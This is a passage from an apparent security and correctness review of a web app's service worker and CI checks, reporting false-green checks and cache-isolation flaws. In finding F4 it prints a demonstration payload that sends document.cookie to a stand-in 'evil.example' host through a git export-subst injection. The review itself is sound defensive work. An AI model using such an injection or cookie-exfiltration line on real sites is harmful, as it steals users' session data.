B (THROWING FETCH HANDLER, same port)                sessions watched: 1   CHECK 4 PASSED  exit 0
```

B's watcher attached to **A's** browser, watched **A's healthy worker**, satisfied the `sessionCount() === 0` guard at `:246`, and printed "1 session watched" as evidence it was looking. A broken `sw.js` went green. Reachable by: a second concurrent run, a matrix or self-hosted runner, an orphaned Chromium from a timed-out run (WO-0100's own notes record exactly such a kill), or a developer's Chrome already on 9333. Fix: random port + assert browser identity, or read the launched process's `DevToolsActivePort`.

### 13. FALSE GREEN — a mid-run socket drop goes green and still reports "1 session watched". DEMONSTRATED.
`lib/sw-cdp.mjs:24-28` installs `open`/`error` handlers `{once:true}` for the handshake only; after that there is no `close` or `error` handler, and `sessionCount()` counts sessions *ever added*, never removed (`:39,54,85`).

```
N_late2500        (SW throws at t+2500ms, no drop)  -> CHECK 4 FAILED  exit 1
N2_late2500_drop  (same, socket dropped at t+1500ms) -> sessions watched: 1
                                                        CHECK 4 PASSED  exit 0
```

Same root cause as 12: the guard proves *an attach happened*, never *that observation was live and pointed at the right browser for the window*. One `Runtime.evaluate` round-trip on the worker session immediately before the final assertion closes both.

### 14. A worker that never activates passes, and `controlled` is never asserted. DEMONSTRATED. Contradicts a documented claim.
`check-load.mjs:281` accepts `installing` and `waiting` as pass. An `install` handler with `event.waitUntil(new Promise(function(){}))` — hangs, throws nothing:

```
service worker: installing; page controlled by it after reload: false
CHECK 4 PASSED — console clean of same-origin errors; service worker installing.   exit 0
```

Offline capability dead, northstar invariant 3 dead, green. Independently confirmed by both of us: `controlled` appears at exactly `:43` (comment), `:232` (assignment), `:259` (printed) — **never in a conditional.** That falsifies `docs/feedback/PUP-WO-0100.md` F16's compensating claim, "the page is now verified to end up **controlled** by the worker." It is measured and printed, not verified.

Related and measured: `sw.js:133` calls `clients.claim()`, so on a healthy tree the page is already controlled *before* the reload branch, which means `check-load.mjs:222-231` never executes and the comment at `:243` ("The worker's fetch handler runs on the reload") describes a path that does not run.

### 15. The §3.4 evidence was never produced on the browser CI actually uses. REASONED — and this is the "assumed, asserted as demonstrated" item.
CI runs `channel: 'chromium'` (`check-load.mjs:102`) — Playwright's pinned build. Every result in `docs/feedback/PUP-WO-0101.md` §3.4 was produced under `PUPPAD_CHROMIUM=/usr/bin/chromium-browser` (snap Chromium 151 on this box), and **no CI run id is cited** — in direct contrast to WO-0100 F12, where the builder closed exactly this gap with run `33460652731`. Unproven on the runner: that Playwright's pinned build honours `--remote-debugging-port`, that `/json/version` is served, and that two independent CDP clients — Playwright's pipe and this raw socket — both issuing `Target.setAutoAttach` with `waitForDebuggerOnStart: true` compose. That last is not a supported composition: this watcher pauses **every** target browser-wide and hand-releases non-worker ones (`sw-cdp.mjs:58-61`) while Playwright is concurrently initialising those same targets. It works on Chromium 151. It is not guaranteed to work on the pinned build, and §3.4's table reports it as settled.

### 16. `sw.js:143-145` is an unguarded floating promise chain, and the new watcher makes it a tripwire. DEMONSTRATED (mechanism).
```js
caches.open(CACHE_NAME).then(function(cache) { cache.put(event.request, clone); });
```
No `.catch`. An unhandled rejection in the worker now fails check 4 (demonstrated: a throw inside that chain → RED). `cache.put` rejects on a non-GET request, a 206, or an opaque-redirect response — none of which have any user-visible effect, since the response was already returned at `:146`. Not reachable in today's hermetic run, but it becomes reachable the moment a controlled page issues any non-GET or partial-content same-origin request. Adding `.catch(function(){})` is a one-line fix and is *not* the fetch-strategy rewrite §4 fences off.

### 17. CDP-sourced errors bypass `isOurs()` and are hardcoded as `sw.js`. DEMONSTRATED.
`sw-cdp.mjs:53` filters only on `info.type === 'service_worker'` — no scope, URL, or origin test — and `:70,:78` hardcode `where: 'sw.js'`. A second worker at `/sub/sw2.js` was caught (good) but reported as `[service worker uncaught exception] sw.js`. The origin-attribution mechanism `check-load.mjs:125` spends thirty lines justifying is never applied to worker errors. Combined with finding 12, a **foreign browser's** worker error is attributed to PupPad's `sw.js` — misclassification in the unsafe direction.

### 18. Minor, all reasoned or low-severity
- **Observation window ~3.5s** (`SETTLE_MS` 3000 + `waitForTimeout(500)` at `:243`). A `setTimeout(throw, 10000)` in `sw.js` passes. Inherited from WO-0100 F5 and documented for the *page*; the new worker coverage is bounded by the same window and that is not stated.
- **`Log.enable` is never sent** (`sw-cdp.mjs:55` enables `Runtime` only), so `Log.entryAdded` messages — failed `cache.addAll` sub-requests, CSP violations, mixed content — are invisible in the worker while the page sees them. Worker coverage is narrower than page coverage, undocumented.
- **TDZ race**: `check-load.mjs:108` passes `(e) => record(ownErrors, e)` before `const ownErrors` is initialised at `:118`, with an `await` at `:116` in the gap. A `harness`-kind error arriving there throws `ReferenceError` in the WebSocket handler. Fails red, so safe, but with a confusing stack.
- **Fixed debug port + `--no-sandbox`** opens full browser control on `127.0.0.1:9333`. Noise on a GitHub-hosted single-tenant VM; on a self-hosted runner it is both a control surface and, via finding 12, a way for any local process to make check 4 green.

### What the watcher genuinely does catch — all demonstrated red
Top-level throw during script evaluation (`waitForDebuggerOnStart` really does win the race), throw in `install`, throw in `activate`, `install` rejecting via `waitUntil` with no throw, unhandled rejection, `console.error` in the worker, a second worker at a different scope, and — notably — **a worker already running before the watcher attaches**: `Target.setAutoAttach` picks up the pre-existing target, so "already installed from a previous run" is *not* a gap. A CDP port occupied by a non-CDP listener fails **red**. Correctly green by design and correctly documented at `:216-221`: a fetch handler that returns a broken response.

---

## Revised standing

Findings 12, 13, 14 move check 4 out of my "sound" list. Corrected assessment: **the raw-CDP route was the right call and the mechanism is real — §1.5's acceptance criterion is met — but the builder's stated guarantee ("fails if no worker session was ever attached" / "green because nothing was looking is the exact failure this closes") is overstated in two demonstrated ways, and the claim that the page is "verified to end up controlled" is false.** That is a narrower retraction than it sounds: the check still fires red on the defect the WO named. It is not a check you can lean on to say nothing was missed.

Finding 15 also belongs in the "asserted as demonstrated, appears to have been assumed" bucket alongside `ci.yml:159-169`'s tautology claim and `feedback:27`'s "no check was weakened" — three separate places where the artifact reports a property it does not have, all three on the safety-critical path.

## VERDICT — unchanged

**No.** Two demonstrated paths put `main`'s content under `/stable/` while the invariant-4 step prints OK; check 3 has a demonstrated green-on-stale-cache regression (§0 flag-and-stop); the `/stable/` exclusion falls to a one-character typo; the publish job will deploy the origin-wide reaper currently on `refs/heads/stable` without any check reading it; and the runtime watcher built to guarantee nothing was missed has two demonstrated false greens of its own.
`````

---

# SECOND PASS — after the stop was worked

**Artifact reviewed:** commit `4d48aae`, frozen, every deliverable inside the freeze.
**Verdict: still NOT safe to merge.** It confirmed 11 of the previous 18 as fixed
and found 13 more, four of them serious. The builder accepts that verdict; the
dispositions and the further fixes are in `docs/feedback/PUP-WO-0101.md`.

**The deepest finding in the project so far is its F1**, and it is architectural
rather than a slip: `sw.js`'s reap was prefix-bounded while its offline **read**
was `CacheStorage.match`, which searches **every cache on the origin**. That
falsifies northstar invariant 7 by the invariant's own stated test, with all six
checks green — and no check could see it, because the test harness's `match()`
returned `undefined` unconditionally. The line was unchanged since `2952aa1`; what
made it a violation is this work order putting two caches on one origin.

The full second report follows unedited. Its finding numbers F1–F13 are its own.

`````text
Tree re-verified frozen: `4d48aae`, `git status --short` empty at start and end. Every experiment ran on copies under `/tmp`; the working tree was never modified.

# FINDINGS

## F1 — northstar invariant 7 is falsified by its own stated test, with all six checks green. `sw.js:225`. DEMONSTRATED. HIGH.

Invariant 7's falsification test is *"Load the promoted copy after the test copy has been cached; find any asset served from the other build."* I ran exactly that, in Chromium, against the frozen `sw.js`:

    1. TEST copy (root) fetches the shared third-party asset -> /* THE TEST BUILD (root) ERA LIBRARY */
       root cache now holds: [ 'http://localhost:34763/lib.js' ]
    2. PROMOTED copy controlled: true
       stable cache holds  : []                      <-- the promoted copy never cached it
    >>> 3. PROMOTED copy, third party unreachable, was served:
        "/* THE TEST BUILD (root) ERA LIBRARY */"

`sw.js:225` is `return caches.match(event.request);` — the **global** `CacheStorage.match`, which searches *every cache on the origin*. The reap is prefix-bounded; **the read is origin-wide.** Two hundred lines of prose above it argue that no worker may touch what it does not own, and the offline path three lines below reads the other deploy path's cache.

The line is unchanged from `2952aa1` — it is not a regression. **But PUP-WO-0101 is the change that puts two caches on one origin, which is what converts that line from harmless into an invariant-7 violation.** No check can see it: `sw-harness.mjs:26` is `async match() { return undefined; }`, so check 5 is structurally blind, and neither check 4 nor check 6 exercises offline. Fix is one line: `caches.open(CACHE_NAME).then(c => c.match(event.request))`.

## F2 — check 6 hardcodes `v17`. The next legitimate app change is unshippable. DEMONSTRATED. HIGH (operational).

Bumped `CACHE_VERSION` to `'v18'` — the change check 3 *mandates* whenever a cached asset changes — and ran the shipped check 6: FAIL root worker cache missing / FAIL stable worker cache missing / FAIL the /stable/ cache was DELETED, exit=1. Check 5 passes on the same tree. So: edit `index.html` -> check 3 demands a bump -> check 6 goes red -> `publish` `needs: checks` -> **nothing publishes.** Don't bump -> check 3 red. The two checks contradict each other on every app change. Worse, the failure message is a lie: it says the `/stable/` cache was deleted while the line above prints it intact. And `caches.open('puppad|%2F|v17')` *creates* the cache when the name has moved, so item 7 degrades to a vacuous `ok`.

## F3 — finding 5 is NOT closed. Two demonstrated evasions of check 3. DEMONSTRATED x2. HIGH.

**(a) No comment needed — two lines of plain, valid JS.** `String.match` still takes the *first* line-anchored hit: `var CACHE_VERSION = 'v18';` then `var CACHE_VERSION = 'v17';`. Check reads v18, worker uses v17, exit 0 with a false sentence printed.

**(b) The original comment attack, verbatim, still works.** The `^\s*var` anchor requires a *line start*, not *code*. A block comment whose lines begin at column 0 defeats it — and so does the new derivation assertion, which is a bare `.test()` over the whole file.

**One fairness correction to the record.** WO-0100's original `cacheName()` was the same first-match text-scrape. The new check is **strictly stronger** than what it replaced, so I do *not* think the §0 "a WO-0100 check was weakened" condition still fires. What fires is that the underlying proposition is still demonstrably false and the builder's table reports it closed. The right fix is a parse, not a better regex.

## F4 — `git archive HEAD` does not write "the commit's tree and nothing else". Arbitrary JS from a commit message reaches the promoted copy through every gate. DEMONSTRATED. HIGH.

`git archive` honours `.gitattributes` **from the tree it is archiving**:

    === BYTES IN THE COMMIT TREE ===        =>  /* $Format:%s$ */
    === BYTES git archive PUBLISHES ===     =>  /* */ ;fetch("https://evil.example/x?c="+document.cookie); /* */
    commit:    .gitattributes index.html manifest.json
    published: .gitattributes index.html          <-- manifest.json silently dropped (export-ignore)

- **`export-subst`** injects the **commit message** into a published file. The tree reads innocently in review; the payload lives in `git log`, which no gate reads. Invariant 4 passes. `check-syntax`, `check-assets` and `check-cache-isolation` all exit 0 on the resulting promoted copy. That is live JS on the tablet.
- **`export-ignore`** deletes files from the published copy while everything stays green — `check-assets` verifies a reference is *listed in urlsToCache*, never that the file exists. **Fail-open**, green build.
- `actions/upload-pages-artifact@v4` tars with `--dereference`, so a committed symlink is **followed** and its target published; the runner filesystem is reachable that way.

## F5 — check 6 is not run against the published copies, so the sandbox hole is open exactly on the publish path. DEMONSTRATED. HIGH.

The publish job's per-copy loops run `check-syntax check-assets check-cache-isolation` and `check-load`. **Check 6 is in neither.** Planted the `typeof ExtendableEvent` gate in the **promoted** copy: publish gate exit=0, check-load PASSED, check 6 on the same copy FAILED. So the headline rule holds for four of six checks, and the two it misses include the one the file itself says nothing else can catch.

## F6 — finding 4 is not fully closed. `/PupPad/stable` — bare, unencoded, fully canonical — is served by the root worker. DEMONSTRATED. MEDIUM-HIGH.

The encoding fence is genuinely sound (double-encoding, `%2e%2e`, `%2F`/`%2f`, `%00`, malformed `%FF`, unicode solidus, backslash, `//`, `.`, `..` all decline). The hole is the shape nobody encoded: `FOREIGN_SUBTREE` is `/PupPad/stable/` and `indexOf` misses the directory itself. Pages 301s it to `/stable/`; a subresource fetch follows redirects, so the worker caches the **promoted copy's HTML under the root prefix**.

## F7 — NEW regression: legitimate percent-encoded same-origin assets are declined and never cached. DEMONSTRATED. MEDIUM.

`canon !== u.pathname` declines any path whose decode is not the identity. `/my%20photo.png` and `/caf%C3%A9.png` return 200 online and are **not** in the cache. Any asset with a space or non-ASCII character works online and is silently absent offline — invariant 3.

## F8 — nothing in CI ever runs the two *published* workers together. DEMONSTRATED. MEDIUM-HIGH.

Check 5 loads **one** `sw.js` at both scopes; check 6 serves **one** tree at both paths. The property in check 5's own title is never tested on the actual pair, which is the deployed state during every promotion lag. Its per-scope coverage is also asymmetric: the full survivor matrix runs only at ROOT_SCOPE.

## F9 — every check is time-bounded, and nothing says so. DEMONSTRATED. MEDIUM-HIGH.

A reap delayed past `performance.now() > 8000` passes all six checks, then destroys the other cache in a browser at t+10.5s. Check 5 has no observation window at all; check 4's is ~3.5s; check 6's ~5s.

## F10 — finding 8 is NOT fixed and is NOT disclosed. MEDIUM.

`ci.yml` says "five checks"; there are six. Every `sw.js:NN` citation still points at the **pre-PUP-WO-0101 worker**. `check-cache-name.mjs:183` is actively wrong: *"CACHE_NAME must be a plain quoted literal on sw.js:1"* — following it takes the legacy branch.

## F11 — claims the code does not deliver. MEDIUM.

`demo:3` "Not wired into the workflow" — FALSE, it is check 6. `feedback` row 10 "Proven by: New check-5 assertion" — FALSE, no such assertion exists. `sw.js:52` "there is no default" — FALSE of the file; the `'/'` fallback is still present, merely unreachable. `ci.yml:185-189` "nothing else can put unpromoted bytes into a published copy" — FALSE (F4). `ci.yml:9-12` "every copy is checked in the run that publishes it" — OVERSTATED, four of six. `check-load.mjs:236` "Both were tested and both stayed green" — FALSE/stale, contradicted in the same file. `feedback` "finding 15 is the only unclosed one" — FALSE; 5, 8, 17, 18 are also open.

## F12 — publication is all-or-nothing, which disables rollback. REASONED. MEDIUM.

Rolling `stable` back to a known-good commit now fails the publish job, as does shipping an urgent fix to `/PupPad/` while `/stable/` is stale. Fail-closed and defensible; undocumented, and presented purely as a win.

## F13 — smaller, mostly fail-closed

Checkouts use moving refs rather than `github.sha`; the stamp step is not fail-closed (the substitution is a printf ARGUMENT, so `set -e` does not fire — demonstrated writing an empty sha at exit 0); `grep -qi '^stable/'` false-positives on `Stable/`; awk `exit` can yield SIGPIPE 141 with no `::error::`; an empty `stable` tree is accepted; `sw-cdp.mjs` pending promises are never rejected on socket close; `setup-node@v7` vs `@v5` inconsistency.

# The previous 18 — CONFIRMED as fixed

1 FIXED · 2 FIXED · 7 FIXED cleanly · 9 FIXED · 10 FIXED in effect · 11 DISCLOSED · 12 FIXED (squatted the port with a foreign Chromium: exit 1) · 13 FIXED · 14 FIXED (hanging install -> never reached "active") · 16 FIXED · 17 HALF · 18 MOSTLY · 3,6 PARTIAL · 4 PARTIAL · 5 NOT CLOSED · 8 NOT CLOSED, NOT DISCLOSED · 15 honestly characterised.

**And the merge-day path is clean, which matters most.** Simulated the upgrade on a device holding `pup-pad-v16` under the currently-live worker: legacy cache reaped by exact literal, new cache built, offline cold-load works (200, title "Pup Pad"). The single highest-stakes property of this merge holds.

**Is this safe to merge to a branch that publishes to a three-year-old's tablet? No — not yet.** The merge-day path itself is clean and much of the rewrite is genuinely sound, but F2 makes the next app change unshippable, F3 leaves a check green on a stale-cache regression, F4 falsifies the load-bearing claim under the §7 fix with a working arbitrary-JS path to the promoted copy, and F1 falsifies northstar invariant 7 by its own stated test with every check green.
`````
